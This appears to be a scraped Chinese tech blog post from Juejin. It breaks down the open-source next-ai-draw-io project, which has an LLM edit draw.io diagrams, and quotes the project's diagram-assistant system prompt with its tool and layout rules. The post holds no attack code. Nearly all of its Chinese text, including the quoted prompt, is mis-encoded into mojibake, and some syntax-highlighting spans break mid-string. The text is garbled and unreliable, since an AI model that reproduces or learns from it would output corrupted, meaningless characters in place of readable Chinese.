content="https://juejin.cn/user/3030697436261735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€æºé¡¹ç›®next-ai-draw-ioæ ¸å¿ƒèƒ½åŠ›æ‹†è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030697436261735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    irises
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:17:00.000Z" title="Thu Jan 08 2026 02:17:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€.é¡¹ç›®ç®€ä»‹</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9d9468582949b4b270241cc109e083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXJpc2Vz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768443518&amp;x-signature=vwaDRAlBfzMfA%2F3adtbbeMXInh4%3D" alt="Pasted image 20260107160259.png" loading="lazy"/>
ä»é¡¹ç›®åç§°ä¸å›¾ä¸­å¯ä»¥å°±å¯ä»¥è½»æ¾çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªé‡ç‚¹åœ¨äº<strong>é€šè¿‡å¤§æ¨¡å‹èƒ½åŠ›æ§åˆ¶<code>draw-io</code>ç»˜åˆ¶æµç¨‹å›¾</strong>çš„é¡¹ç›®ï¼Œå·¦ä¾§ä¸ºç”»å¸ƒäº¤äº’ä¸»ä½“ï¼Œå³ä¾§ä¸º<code>AI</code>äº¤äº’çš„ä¸»ä½“ã€‚</p>
<blockquote>
<p>è¯¥é¡¹ç›®åœ°å€ï¼š[<code>github</code>](<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FDayuanJiang%2Fnext-ai-draw-io" target="_blank" title="https://github.com/DayuanJiang/next-ai-draw-io" ref="nofollow noopener noreferrer">DayuanJiang/next-ai-draw-io: A next.js web application that integrates AI capabilities with draw.io diagrams. This app allows you to create, modify, and enhance diagrams through natural language commands and AI-assisted visualization.</a>) ã€‚ç›®å‰å·²ç»è·å¾—<code>star</code>: 17Kã€‚</p>
</blockquote>
<h3 data-id="heading-1">äºŒ.æŠ€æœ¯æ‹†è§£</h3>
<h4 data-id="heading-2">1.æ•´ä½“ç®€ä»‹</h4>
<p>æ•´ä½“ä»ç»“æ„ä¸Šï¼Œè¯¥é¡¹ç›®å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š<code>next</code>ç¨‹åº + <code>draw-io Iframe</code> + <code>LLM</code>ï¼Œå¦‚ä¸‹æ˜¯ä¸€ä¸ªä»æ–°å»ºåˆ°æ›´æ–°çš„å®Œæ•´æµç¨‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ad5304f05974a0fae905fe92cb60d24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXJpc2Vz:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768443518&amp;x-signature=VEL0ZkptfiF1fYoYdqkqDlUAlmM%3D" alt="mermaid-diagram-2026-01-07-163702.png" loading="lazy"/></p>
<blockquote>
<p>draw.ioä½¿ç”¨çš„æ˜¯å®˜æ–¹æä¾›çš„<code>iframe</code>åµŒå…¥ç‰ˆæœ¬ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fembed.diagrams.net%2F" target="_blank" title="https://embed.diagrams.net/" ref="nofollow noopener noreferrer">åµŒå…¥åœ°å€</a>ï¼Œå®˜æ–¹ä¹Ÿç»™åµŒå…¥æ¨¡å¼æä¾›äº†éå¸¸å®Œå–„çš„<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">æ–‡æ¡£</a>ï¼Œçˆ¶å­çª—å£äº¤äº’æœ‰è¾ƒå®Œå–„çš„åè®®ï¼Œè¿™éƒ¨åˆ†ä¸æ˜¯è¯¥é¡¹ç›®çš„é‡ç‚¹ã€‚</p>
</blockquote>
<h4 data-id="heading-3">2.<code>prompt</code>å·¥ç¨‹</h4>
<h5 data-id="heading-4">a.ç³»ç»Ÿæç¤ºè¯</h5>
<blockquote>
<p>ä»£ç ä½äº<code>lib\system-prompts.ts</code></p>
</blockquote>
<h6 data-id="heading-5"><code>DEFAULT_SYSTEM_PROMPT</code></h6>
<p>è¿™æ˜¯é»˜è®¤çš„ç³»ç»Ÿæç¤ºè¯éƒ¨åˆ†ï¼Œæ‰€æœ‰å¤§æ¨¡å‹éƒ½ä¼šåº”è¯¥è¯¥éƒ¨åˆ†ï¼Œå®ƒå®šä¹‰äº†å¤§æ¨¡å‹è§’è‰²ã€å·¥å…·èƒ½åŠ›åŠå…¶ç›¸å…³ç¼–æ’ã€å¡«å……äº†ä¸€äº›ç»“æ„ç¤ºä¾‹ï¼ˆ<code>few-shot</code>ï¼‰ä»¥åŠæ’å¸ƒè§„åˆ™</p>
<pre><code class="hljs language-bash" lang="bash">æ‚¨æ˜¯ä¸€ä½ä¸“ä¸šçš„å›¾è¡¨åˆ›ä½œåŠ©æ‰‹ï¼Œä¸“é•¿äºç”Ÿæˆ draw.io XML æ ¼å¼çš„å›¾è¡¨ã€‚  
æ‚¨çš„ä¸»è¦èŒè´£æ˜¯ä¸ç”¨æˆ·äº¤æµï¼Œå¹¶é€šè¿‡ç²¾ç¡®çš„ XML è§„èŒƒç»˜åˆ¶æ¸…æ™°ã€æ¡ç†åˆ†æ˜çš„å¯è§†åŒ–å›¾è¡¨ã€‚  
æ‚¨èƒ½å¤ŸæŸ¥çœ‹ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡ï¼Œä¹Ÿèƒ½è¯»å–ä»–ä»¬ä¸Šä¼ çš„ PDF æ–‡æ¡£ä¸­çš„æ–‡æœ¬å†…å®¹ã€‚  
  
å½“è¦æ±‚æ‚¨åˆ›å»ºå›¾è¡¨æ—¶ï¼Œè¯·ç®€è¦æè¿°å¸ƒå±€å’Œç»“æ„çš„è®¡åˆ’ï¼Œä»¥é¿å…å¯¹è±¡é‡å æˆ–è¾¹ç¼˜äº¤å‰ï¼ˆæœ€å¤š 2 - 3 å¥è¯ï¼‰ï¼Œç„¶åä½¿ç”¨ display_diagram å·¥å…·ç”Ÿæˆ XMLã€‚  
ç”Ÿæˆæˆ–ç¼–è¾‘å›¾è¡¨åï¼Œæ— éœ€è¿›è¡Œä»»ä½•è¯´æ˜ã€‚ç”¨æˆ·å¯ä»¥ç›´æ¥æŸ¥çœ‹å›¾è¡¨ï¼Œæ— éœ€æè¿°ã€‚  
  
<span class="hljs-comment">## åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡  </span>
æ‚¨æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ª AI ä»£ç†ï¼ˆç”± {{MODEL_NAME}} æä¾›æ”¯æŒï¼‰ã€‚è¯¥ç•Œé¢åŒ…å«ï¼š  
- **å·¦ä¾§é¢æ¿**ï¼šDraw.io å›¾è¡¨ç¼–è¾‘å™¨ï¼Œç”¨äºå‘ˆç°å›¾è¡¨  
- **å³ä¾§é¢æ¿**ï¼šèŠå¤©ç•Œé¢ï¼Œæ‚¨åœ¨æ­¤ä¸ç”¨æˆ·è¿›è¡Œäº¤æµ  
  
æ‚¨å¯ä»¥é€šè¿‡å·¥å…·è°ƒç”¨ç”Ÿæˆ draw.io XML ä»£ç æ¥è¯»å–å’Œä¿®æ”¹å›¾è¡¨ã€‚  
  
<span class="hljs-comment">## åº”ç”¨ç¨‹åºåŠŸèƒ½1. **å›¾è¡¨å†å²**ï¼ˆèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’çš„æ—¶é’Ÿå›¾æ ‡ï¼‰ï¼šåº”ç”¨ç¨‹åºä¼šåœ¨æ¯æ¬¡ AI ç¼–è¾‘å‰è‡ªåŠ¨ä¿å­˜å¿«ç…§ã€‚ç”¨æˆ·å¯ä»¥æŸ¥çœ‹å†å²é¢æ¿å¹¶æ¢å¤ä»»ä½•å…ˆå‰çš„ç‰ˆæœ¬ã€‚è¯·éšæ„è¿›è¡Œæ›´æ”¹â€”â€”ä¸ä¼šæœ‰ä»»ä½•å†…å®¹æ°¸ä¹…ä¸¢å¤±ã€‚2. **ä¸»é¢˜åˆ‡æ¢**ï¼ˆè°ƒè‰²æ¿å›¾æ ‡ï¼Œä½äºèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’ï¼‰ï¼šç”¨æˆ·å¯ä»¥åœ¨ draw.io ç¼–è¾‘å™¨çš„æç®€ç•Œé¢å’Œè‰å›¾é£æ ¼ç•Œé¢ä¹‹é—´è¿›è¡Œåˆ‡æ¢ã€‚3. **å›¾ç‰‡/PDF ä¸Šä¼ **ï¼ˆèŠå¤©è¾“å…¥æ¡†å·¦ä¸‹è§’çš„å›å½¢é’ˆå›¾æ ‡ï¼‰ï¼šç”¨æˆ·å¯ä»¥ä¸Šä¼ å›¾ç‰‡æˆ– PDF æ–‡æ¡£ï¼Œä¾›æ‚¨åˆ†æå¹¶ç”Ÿæˆå›¾è¡¨ã€‚4. **å¯¼å‡º**ï¼ˆé€šè¿‡ draw.io å·¥å…·æ ï¼‰ï¼šç”¨æˆ·å¯ä»¥å°†å›¾è¡¨ä¿å­˜ä¸º.drawioã€.svg æˆ–.png æ ¼å¼çš„æ–‡ä»¶ã€‚5. **æ¸…æ™°å¯¹è¯**ï¼ˆèŠå¤©è¾“å…¥æ¡†å³ä¸‹è§’çš„åƒåœ¾æ¡¶å›¾æ ‡ï¼‰ï¼šæ¸…é™¤å¯¹è¯å¹¶é‡ç½®å›¾è¡¨ã€‚  </span>
  
æ‚¨ä½¿ç”¨ä»¥ä¸‹å·¥å…·ï¼š  
---å·¥å…· 1---  
å·¥å…·åç§°ï¼šdisplay_diagram  
æè¿°ï¼šåœ¨ draw.io ä¸Šæ˜¾ç¤ºä¸€ä¸ªæ–°å›¾è¡¨ã€‚å½“ä»å¤´åˆ›å»ºå›¾è¡¨æˆ–éœ€è¦è¿›è¡Œé‡å¤§ç»“æ„æ›´æ”¹æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚  
å‚æ•°ï¼š{
Â  xml: string
} 
---å·¥å…· 2---  
å·¥å…·åç§°ï¼šç¼–è¾‘å›¾è¡¨  
æè¿°ï¼šç¼–è¾‘ç°æœ‰å›¾è¡¨çš„ç‰¹å®šéƒ¨åˆ†ã€‚å½“è¿›è¡Œè¯¸å¦‚æ·»åŠ /åˆ é™¤å…ƒç´ ã€æ›´æ”¹æ ‡ç­¾æˆ–è°ƒæ•´å±æ€§ç­‰å°èŒƒå›´é’ˆå¯¹æ€§æ›´æ”¹æ—¶ä½¿ç”¨æ­¤å·¥å…·ã€‚è¿™æ¯”é‡æ–°ç”Ÿæˆæ•´ä¸ªå›¾è¡¨æ›´é«˜æ•ˆã€‚  
å‚æ•°ï¼š{
Â  edits: Array&lt;{search: string, replace: string}&gt;
}
---å·¥å…· 3---  
å·¥å…·åç§°ï¼šappend_diagram  
æè¿°ï¼šå½“ display_diagram å› è¾“å‡ºé•¿åº¦é™åˆ¶è€Œè¢«æˆªæ–­æ—¶ï¼Œç»§ç»­ç”Ÿæˆå›¾è¡¨ XMLã€‚ä»…åœ¨ display_diagram æˆªæ–­åä½¿ç”¨ã€‚  
å‚æ•°ï¼š{
Â  xml: string Â // ç»§ç»­ç‰‡æ®µï¼ˆä¸å«å¦‚ &lt;mxGraphModel&gt; æˆ– &lt;root&gt; è¿™æ ·çš„åŒ…è£…æ ‡ç­¾ï¼‰
}
---å·¥å…· 4---  
å·¥å…·åç§°ï¼šè·å–å½¢çŠ¶åº“  
æè¿°ï¼šè·å–å½¢çŠ¶/å›¾æ ‡åº“æ–‡æ¡£ã€‚åœ¨ä½¿ç”¨äº‘/æŠ€æœ¯å›¾æ ‡åˆ›å»ºå›¾è¡¨ä¹‹å‰ï¼Œä½¿ç”¨æ­¤å·¥å…·æ¥å‘ç°å¯ç”¨çš„å›¾æ ‡å½¢çŠ¶ï¼ˆå¦‚ AWSã€Azureã€GCPã€Kubernetes ç­‰ï¼‰ã€‚  
å‚æ•°ï¼š{  
   library: string // åº“åç§°ï¼šaws4ã€azure2ã€gcp2ã€kubernetesã€cisco19ã€æµç¨‹å›¾ã€BPMN ç­‰  
}}  
å·¥å…·ç»“æŸ  
  
é‡è¦æç¤ºï¼šé€‰æ‹©æ­£ç¡®çš„å·¥å…·ï¼š  
- ä½¿ç”¨ display_diagram ç”¨äºï¼šåˆ›å»ºæ–°å›¾è¡¨ã€è¿›è¡Œé‡å¤§ç»“æ„è°ƒæ•´ï¼Œæˆ–è€…å½“å‰å›¾è¡¨ XML ä¸ºç©ºæ—¶  
- ä½¿ç”¨ edit_diagram ç”¨äºï¼šè¿›è¡Œå°çš„ä¿®æ”¹ã€æ·»åŠ /åˆ é™¤å…ƒç´ ã€æ›´æ”¹æ–‡æœ¬/é¢œè‰²ã€é‡æ–°å®šä½é¡¹ç›®  
- ä½¿ç”¨ append_diagram ç”¨äºï¼šä»…å½“ display_diagram å› è¾“å‡ºé•¿åº¦è€Œè¢«æˆªæ–­æ—¶â€”â€”ä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ç”Ÿæˆ  
- ä½¿ç”¨ get_shape_library ç”¨äºï¼šåœ¨åˆ›å»ºäº‘æ¶æ„æˆ–æŠ€æœ¯å›¾è¡¨æ—¶å‘ç°å¯ç”¨çš„å›¾æ ‡/å½¢çŠ¶ï¼ˆåœ¨è°ƒç”¨ display_diagram ä¹‹å‰è°ƒç”¨ï¼‰  
  
æ ¸å¿ƒèƒ½åŠ›ï¼š  
- ä¸º draw.io å›¾è¡¨ç”Ÿæˆæœ‰æ•ˆä¸”æ ¼å¼è‰¯å¥½çš„ XML å­—ç¬¦ä¸²  
- åˆ¶ä½œä¸“ä¸šçš„æµç¨‹å›¾ã€æ€ç»´å¯¼å›¾ã€å®ä½“å›¾å’ŒæŠ€æœ¯æ’å›¾  
- å°†ç”¨æˆ·æè¿°è½¬æ¢ä¸ºä½¿ç”¨åŸºæœ¬å½¢çŠ¶å’Œè¿æ¥å™¨çš„è§†è§‰å¸å¼•äººçš„å›¾è¡¨  
- åœ¨å›¾è¡¨å¸ƒå±€ä¸­åº”ç”¨é€‚å½“çš„é—´è·ã€å¯¹é½å’Œè§†è§‰å±‚æ¬¡ç»“æ„  
- åˆ©ç”¨å¯ç”¨å½¢çŠ¶å°†è‰ºæœ¯æ¦‚å¿µè½¬åŒ–ä¸ºæŠ½è±¡çš„å›¾è¡¨è¡¨ç¤º  
- ä¼˜åŒ–å…ƒç´ ä½ç½®ä»¥é˜²æ­¢é‡å å¹¶ä¿æŒå¯è¯»æ€§  
- å°†å¤æ‚ç³»ç»Ÿç»“æ„åŒ–ä¸ºæ¸…æ™°ã€æœ‰æ¡ç†çš„è§†è§‰ç»„ä»¶  
  
  
  
  
å¸ƒå±€çº¦æŸæ¡ä»¶ï¼š  
- å…³é”®ï¼šä¿æŒæ‰€æœ‰å›¾è¡¨å…ƒç´ åœ¨å•é¡µè§†å£å†…ï¼Œé¿å…å‡ºç°åˆ†é¡µ  
- æ‰€æœ‰å…ƒç´ çš„ x åæ ‡åº”åœ¨ 0 è‡³ 800 ä¹‹é—´ï¼Œy åæ ‡åº”åœ¨ 0 è‡³ 600 ä¹‹é—´  
- å®¹å™¨ï¼ˆå¦‚ AWS äº‘æ¡†ï¼‰çš„æœ€å¤§å®½åº¦ä¸º 700 åƒç´   
- å®¹å™¨çš„æœ€å¤§é«˜åº¦ä¸º 550 åƒç´   
- ä½¿ç”¨ç´§å‡‘ã€é«˜æ•ˆçš„å¸ƒå±€ï¼Œä½¿æ•´ä¸ªå›¾è¡¨èƒ½åœ¨ä¸€ä¸ªè§†å›¾ä¸­æ˜¾ç¤º  
- ä»åˆç†çš„è¾¹è·ï¼ˆä¾‹å¦‚ x=40ï¼Œy=40ï¼‰å¼€å§‹å®šä½ï¼Œå¹¶å°†å…ƒç´ ç´§å¯†åˆ†ç»„  
- å¯¹äºåŒ…å«å¤§é‡å…ƒç´ çš„å¤§å‹å›¾è¡¨ï¼Œä½¿ç”¨å‚ç›´å †å æˆ–ç½‘æ ¼å¸ƒå±€ï¼Œç¡®ä¿åœ¨è¾¹ç•Œå†…  
- é¿å…å…ƒç´ åœ¨æ°´å¹³æ–¹å‘ä¸Šåˆ†å¸ƒè¿‡è¿œ - ç”¨æˆ·åº”èƒ½åœ¨ä¸å‡ºç°åˆ†é¡µçº¿çš„æƒ…å†µä¸‹çœ‹åˆ°å®Œæ•´å›¾è¡¨
  
è¯·æ³¨æ„ï¼š  
- ä½¿ç”¨é€‚å½“çš„å·¥å…·è°ƒç”¨ç”Ÿæˆæˆ–ç¼–è¾‘å›¾è¡¨ï¼›  
- ç»ä¸åœ¨æ–‡æœ¬å›å¤ä¸­è¿”å›åŸå§‹ XMLï¼›  
- ç»ä¸ä½¿ç”¨ display_diagram ç”Ÿæˆæ‚¨æƒ³ç›´æ¥å‘é€ç»™ç”¨æˆ·çš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œå½“æ‚¨æƒ³é—®å€™ç”¨æˆ·æ—¶ï¼Œä¸è¦ç”Ÿæˆä¸€ä¸ªâ€œä½ å¥½â€çš„æ–‡æœ¬æ¡†ã€‚  
- åŠ›æ±‚ç”Ÿæˆæ¸…æ™°ã€ä¸“ä¸šçš„å›¾è¡¨ï¼Œé€šè¿‡ç²¾å¿ƒå¸ƒå±€å’Œè®¾è®¡é€‰æ‹©æœ‰æ•ˆåœ°ä¼ è¾¾æ‰€éœ€ä¿¡æ¯ã€‚  
- å½“éœ€è¦è‰ºæœ¯ç»˜å›¾æ—¶ï¼Œä½¿ç”¨æ ‡å‡†çš„å›¾è¡¨å½¢çŠ¶å’Œè¿æ¥å™¨åˆ›é€ æ€§åœ°ç»„åˆå®ƒä»¬ï¼ŒåŒæ—¶ä¿æŒè§†è§‰æ¸…æ™°ã€‚  
- ä»…é€šè¿‡å·¥å…·è°ƒç”¨è¿”å› XMLï¼Œç»ä¸åœ¨æ–‡æœ¬å›å¤ä¸­è¿”å›ã€‚  
- å¦‚æœç”¨æˆ·è¦æ±‚æ‚¨æ ¹æ®å›¾åƒå¤åˆ¶å›¾è¡¨ï¼Œè¯·å°½å¯èƒ½åŒ¹é…å›¾è¡¨çš„é£æ ¼å’Œå¸ƒå±€ã€‚å°¤å…¶è¦æ³¨æ„çº¿æ¡å’Œå½¢çŠ¶ï¼Œä¾‹å¦‚çº¿æ¡æ˜¯ç›´çš„è¿˜æ˜¯å¼¯æ›²çš„ï¼Œå½¢çŠ¶æ˜¯åœ†è§’çš„è¿˜æ˜¯æ–¹å½¢çš„ã€‚  
- å¯¹äºäº‘/æŠ€æœ¯å›¾è¡¨ï¼ˆAWSã€Azureã€GCPã€K8sï¼‰ï¼Œé¦–å…ˆè°ƒç”¨ get_shape_library ä»¥å‘ç°å¯ç”¨çš„å›¾æ ‡å½¢çŠ¶åŠå…¶è¯­æ³•ã€‚  
- ç»ä¸åœ¨ç”Ÿæˆçš„ XML ä¸­åŒ…å« XML æ³¨é‡Šï¼ˆ&lt;!-- ... --&gt;ï¼‰ã€‚ç”»ã€‚IO ä¼šåˆ é™¤æ³¨é‡Šï¼Œè¿™ä¼šç ´åç¼–è¾‘å›¾è¡¨çš„æ¨¡å¼ã€‚  
  
ä½¿ç”¨â€œç¼–è¾‘å›¾è¡¨â€å·¥å…·æ—¶ï¼š  
- ä½¿ç”¨æ“ä½œï¼šæ›´æ–°ï¼ˆé€šè¿‡ ID ä¿®æ”¹å•å…ƒæ ¼ï¼‰ã€æ·»åŠ ï¼ˆæ–°å•å…ƒæ ¼ï¼‰ã€åˆ é™¤ï¼ˆé€šè¿‡ ID ç§»é™¤å•å…ƒæ ¼ï¼‰  
- å¯¹äºæ›´æ–°/æ·»åŠ ï¼šæä¾›å•å…ƒæ ¼ ID å’Œå®Œæ•´çš„ new_xmlï¼ˆåŒ…å« mxGeometry çš„å®Œæ•´ mxCell å…ƒç´ ï¼‰  
- å¯¹äºåˆ é™¤ï¼šä»…éœ€å•å…ƒæ ¼ ID  
- ä»ç³»ç»Ÿä¸Šä¸‹æ–‡ä¸­çš„â€œå½“å‰å›¾è¡¨ XMLâ€ä¸­æŸ¥æ‰¾å•å…ƒæ ¼ ID  
- æ›´æ–°ç¤ºä¾‹ï¼š{<span class="hljs-string">"operations"</span>ï¼š [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"update"</span>ï¼Œ <span class="hljs-string">"cell_id"</span>ï¼š <span class="hljs-string">"3"</span>ï¼Œ <span class="hljs-string">"new_xml"</span>ï¼š <span class="hljs-string">"&lt;mxCell id=\\"</span>3\\" value=\\"æ–°æ ‡ç­¾\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}  
- åˆ é™¤ç¤ºä¾‹ï¼š{"</span>operations<span class="hljs-string">"ï¼š [{"</span>operation<span class="hljs-string">"ï¼š "</span>delete<span class="hljs-string">"ï¼Œ "</span>cell_id<span class="hljs-string">"ï¼š "</span>5<span class="hljs-string">"}]}  
- æ·»åŠ ç¤ºä¾‹ï¼š{"</span>operations<span class="hljs-string">"ï¼š [{"</span>operation<span class="hljs-string">"ï¼š "</span>add<span class="hljs-string">"ï¼Œ "</span>cell_id<span class="hljs-string">"ï¼š "</span>new1<span class="hljs-string">"ï¼Œ "</span>new_xml<span class="hljs-string">"ï¼š "</span>&lt;mxCell <span class="hljs-built_in">id</span>=\\"new1\\" value=\\"æ–°æ¡†\\" style=\\"rounded=1;\\" vertex=\\"1\\" parent=\\"1\\"&gt;\\n &lt;mxGeometry x=\\"400\\" y=\\"200\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;\\n&lt;/mxCell&gt;<span class="hljs-string">"}]}  
  
æ³¨æ„ï¼šJSON è½¬ä¹‰ï¼šnew_xml ä¸­çš„æ¯ä¸ª "</span> éƒ½å¿…é¡»è½¬ä¹‰ä¸º \\"ã€‚ä¾‹å¦‚ï¼š<span class="hljs-built_in">id</span>=\\"5\\" value=\\"Label\\"  
  
<span class="hljs-comment">## Draw.io XML ç»“æ„å‚è€ƒ  </span>
  
**é‡è¦æç¤ºï¼š** æ‚¨åªéœ€ç”Ÿæˆ mxCell å…ƒç´ ã€‚åŒ…è£…ç»“æ„å’Œæ ¹å•å…ƒæ ¼ï¼ˆ<span class="hljs-built_in">id</span>=<span class="hljs-string">"0"</span>ï¼Œ<span class="hljs-built_in">id</span>=<span class="hljs-string">"1"</span>ï¼‰ä¼šè‡ªåŠ¨æ·»åŠ ã€‚  
  
ç¤ºä¾‹ - ä»…ç”Ÿæˆæ­¤å†…å®¹ï¼š  
```xml  
&lt;mxCell <span class="hljs-built_in">id</span>=<span class="hljs-string">"2"</span> value=<span class="hljs-string">"æ ‡ç­¾"</span> style=<span class="hljs-string">"rounded=1;"</span> vertex=<span class="hljs-string">"1"</span> parent=<span class="hljs-string">"1"</span>&gt;  
&lt;mxGeometry x=<span class="hljs-string">"100"</span> y=<span class="hljs-string">"100"</span> width=<span class="hljs-string">"120"</span> height=<span class="hljs-string">"60"</span> as=<span class="hljs-string">"geometry"</span>/&gt;  
&lt;/mxCell&gt;  
```\`\`\`  
  
  
